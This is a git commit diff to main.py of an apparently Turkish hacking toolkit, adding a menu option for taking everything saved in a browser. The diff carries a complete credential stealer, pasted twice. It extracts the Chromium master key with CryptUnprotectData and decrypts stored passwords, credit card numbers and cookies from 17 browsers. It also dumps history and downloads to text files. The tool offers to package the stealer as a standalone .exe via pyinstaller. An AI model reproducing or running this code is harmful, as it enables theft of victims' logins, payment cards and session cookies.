297749a809db21f383dbca09a018177ae9e421cc
HeJo-1 <152224096+HeJo-1@users.noreply.github.com>
2024-06-30 00:56:53 +0300

    Update main.py

--- main.py
+++ main.py
@@ -23,6 +23,348 @@ import requests, re , colorama ,random
 from colorama import Fore, Back, Style
 from requests.structures import CaseInsensitiveDict
 user = str(input("User Name : "))
+
+def chrome():
+    def kayıt():
+        kod = '''
+        
+        import base64
+        import json
+        import os
+        import shutil
+        import sqlite3
+        from datetime import datetime, timedelta
+
+        from Crypto.Cipher import AES
+        from win32crypt import CryptUnprotectData
+
+        appdata = os.getenv('LOCALAPPDATA')
+
+        browsers = {
+            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
+            'amigo': appdata + '\\Amigo\\User Data',
+            'torch': appdata + '\\Torch\\User Data',
+            'kometa': appdata + '\\Kometa\\User Data',
+            'orbitum': appdata + '\\Orbitum\\User Data',
+            'cent-browser': appdata + '\\CentBrowser\\User Data',
+            '7star': appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': appdata + '\\Iridium\\User Data',
+        }
+
+        data_queries = {
+            'login_data': {
+                'query': 'SELECT action_url, username_value, password_value FROM logins',
+                'file': '\\Login Data',
+                'columns': ['URL', 'Email', 'Password'],
+                'decrypt': True
+            },
+            'credit_cards': {
+                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+                'file': '\\Web Data',
+                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+                'decrypt': True
+            },
+            'cookies': {
+                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
+                'file': '\\Network\\Cookies',
+                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
+                'decrypt': True
+            },
+            'history': {
+                'query': 'SELECT url, title, last_visit_time FROM urls',
+                'file': '\\History',
+                'columns': ['URL', 'Title', 'Visited Time'],
+                'decrypt': False
+            },
+            'downloads': {
+                'query': 'SELECT tab_url, target_path FROM downloads',
+                'file': '\\History',
+                'columns': ['Download URL', 'Local Path'],
+                'decrypt': False
+            }
+        }
+
+
+        def get_master_key(path: str):
+            if not os.path.exists(path):
+                return
+
+            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+                return
+
+            with open(path + "\\Local State", "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+
+            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            key = key[5:]
+            key = CryptUnprotectData(key, None, None, None, 0)[1]
+            return key
+
+
+        def decrypt_password(buff: bytes, key: bytes) -> str:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+
+            return decrypted_pass
+
+
+        def save_results(browser_name, type_of_data, content):
+            if content is not None:
+                file_path = f'{browser_name}_{type_of_data}.txt'
+                with open(file_path, 'w', encoding="utf-8") as file:
+                    file.write(content)
+                print(f"\t [*] Saved {type_of_data} for {browser_name} in {file_path}")
+            else:
+                print(f"\t [-] No Data Found for {type_of_data} in {browser_name}")
+
+
+
+
+        def get_data(path: str, profile: str, key, type_of_data):
+            db_file = f'{path}\\{profile}{type_of_data["file"]}'
+            if not os.path.exists(db_file):
+                return
+            result = ""
+            shutil.copy(db_file, 'temp_db')
+            conn = sqlite3.connect('temp_db')
+            cursor = conn.cursor()
+            cursor.execute(type_of_data['query'])
+            for row in cursor.fetchall():
+                row = list(row)
+                if type_of_data['decrypt']:
+                    for i in range(len(row)):
+                        if isinstance(row[i], bytes):
+                            row[i] = decrypt_password(row[i], key)
+                if data_type_name == 'history':
+                    if row[2] != 0:
+                        row[2] = convert_chrome_time(row[2])
+                    else:
+                        row[2] = "0"
+                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+            conn.close()
+            os.remove('temp_db')
+            return result
+
+
+        def convert_chrome_time(chrome_time):
+            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
+
+
+        def installed_browsers():
+            available = []
+            for x in browsers.keys():
+                if os.path.exists(browsers[x]):
+                    available.append(x)
+            return available
+
+
+        if __name__ == '__main__':
+            
+            
+
+            available_browsers = installed_browsers()
+
+            for browser in available_browsers:
+                browser_path = browsers[browser]
+                master_key = get_master_key(browser_path)
+                print(f"Getting Stored Details from {browser}")
+
+                for data_type_name, data_type in data_queries.items():
+                    print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
+                    data = get_data(browser_path, "Default", master_key, data_type)
+                    save_results(browser, data_type_name, data)
+                    print("\t------\n")
+'''
+        print("[1] .py olarak kayot et\n[2] .exe olarak kayıt et")
+        c = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/TarayıcıBilgileriAlma/DosyaKayıtEtme$ "))
+        if c == 1:
+            ths = open("Chrome.py", "w")
+            ths.write(kod)
+            print("Dosya 'Chrome.py' olarak kayıt edildi")
+        if c == 2:
+            ths = open("Chrome.py", "w")
+            ths.write(kod)
+            subprocess.run(["pyinstaller", "--onefile", "Chrome.py"], check=True)
+            print("'Chrome.exe' olarak kayıt edildi")
+
+    print("[1] Kayıt et\n[2] Kayıt etmeden devam et")
+    choice = int(input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları/TarayıcıBilgileriAlma$ "))
+    if choice == 1:
+        kayıt()
+    elif choice == 2:
+        import base64
+        import json
+        import os
+        import shutil
+        import sqlite3
+        from datetime import datetime, timedelta
+
+        from Crypto.Cipher import AES
+        from win32crypt import CryptUnprotectData
+
+        appdata = os.getenv('LOCALAPPDATA')
+
+        browsers = {
+            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
+            'amigo': appdata + '\\Amigo\\User Data',
+            'torch': appdata + '\\Torch\\User Data',
+            'kometa': appdata + '\\Kometa\\User Data',
+            'orbitum': appdata + '\\Orbitum\\User Data',
+            'cent-browser': appdata + '\\CentBrowser\\User Data',
+            '7star': appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': appdata + '\\Iridium\\User Data',
+        }
+
+        data_queries = {
+            'login_data': {
+                'query': 'SELECT action_url, username_value, password_value FROM logins',
+                'file': '\\Login Data',
+                'columns': ['URL', 'Email', 'Password'],
+                'decrypt': True
+            },
+            'credit_cards': {
+                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+                'file': '\\Web Data',
+                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+                'decrypt': True
+            },
+            'cookies': {
+                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
+                'file': '\\Network\\Cookies',
+                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
+                'decrypt': True
+            },
+            'history': {
+                'query': 'SELECT url, title, last_visit_time FROM urls',
+                'file': '\\History',
+                'columns': ['URL', 'Title', 'Visited Time'],
+                'decrypt': False
+            },
+            'downloads': {
+                'query': 'SELECT tab_url, target_path FROM downloads',
+                'file': '\\History',
+                'columns': ['Download URL', 'Local Path'],
+                'decrypt': False
+            }
+        }
+
+
+        def get_master_key(path: str):
+            if not os.path.exists(path):
+                return
+
+            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
+                return
+
+            with open(path + "\\Local State", "r", encoding="utf-8") as f:
+                c = f.read()
+            local_state = json.loads(c)
+
+            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            key = key[5:]
+            key = CryptUnprotectData(key, None, None, None, 0)[1]
+            return key
+
+
+        def decrypt_password(buff: bytes, key: bytes) -> str:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+
+            return decrypted_pass
+
+
+        def save_results(browser_name, type_of_data, content):
+            if content is not None:
+                file_path = f'{browser_name}_{type_of_data}.txt'
+                with open(file_path, 'w', encoding="utf-8") as file:
+                    file.write(content)
+                print(f"\t [*] Saved {type_of_data} for {browser_name} in {file_path}")
+            else:
+                print(f"\t [-] No Data Found for {type_of_data} in {browser_name}")
+
+
+
+
+        def get_data(path: str, profile: str, key, type_of_data):
+            db_file = f'{path}\\{profile}{type_of_data["file"]}'
+            if not os.path.exists(db_file):
+                return
+            result = ""
+            shutil.copy(db_file, 'temp_db')
+            conn = sqlite3.connect('temp_db')
+            cursor = conn.cursor()
+            cursor.execute(type_of_data['query'])
+            for row in cursor.fetchall():
+                row = list(row)
+                if type_of_data['decrypt']:
+                    for i in range(len(row)):
+                        if isinstance(row[i], bytes):
+                            row[i] = decrypt_password(row[i], key)
+                if data_type_name == 'history':
+                    if row[2] != 0:
+                        row[2] = convert_chrome_time(row[2])
+                    else:
+                        row[2] = "0"
+                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+            conn.close()
+            os.remove('temp_db')
+            return result
+
+
+        def convert_chrome_time(chrome_time):
+            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
+
+
+        def installed_browsers():
+            available = []
+            for x in browsers.keys():
+                if os.path.exists(browsers[x]):
+                    available.append(x)
+            return available
+
+
+        if __name__ == '__main__':
+            
+            
+
+            available_browsers = installed_browsers()
+
+            for browser in available_browsers:
+                browser_path = browsers[browser]
+                master_key = get_master_key(browser_path)
+                print(f"Getting Stored Details from {browser}")
+
+                for data_type_name, data_type in data_queries.items():
+                    print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
+                    data = get_data(browser_path, "Default", master_key, data_type)
+                    save_results(browser, data_type_name, data)
+                    print("\t------\n")
+
 def discord():
     def passwo():
         def get_token(username, password):
@@ -1892,6 +2234,7 @@ def DoğrudanCihazaYapılanSaldırıTooları():
 [2] Pc Killer
 [3] Trojen Oluşturucu
 [4] İp İle Bilgi Toplama
+[5] Tarayıcıdaki Kayıtlı Her Şeyi Alma
 ''')
     secim = input(f"HeJo@{user}:~/DoğrudanCihazaYapılanSaldırıTooları$ ")
     if secim == "1":
@@ -1902,6 +2245,8 @@ def DoğrudanCihazaYapılanSaldırıTooları():
         trojenOluşturucu()
     elif secim == "4":
         ipToİnformation()
+    elif secim == "5":
+        chrome()
 
 def kriptolojiTooları():
     print('''
@@ -1951,6 +2296,7 @@ instagram : bymer_ak
     |-> Pc Killer
     |-> Trojen Oluşturucu
     |-> İp İle Bilgi Toplama
+    |-> Tarayıcıdaki Kayıtlı Her Şeyi Alma
 [5] Kriptoloji Tooları
     |
     |-> Dosya Şifreleme
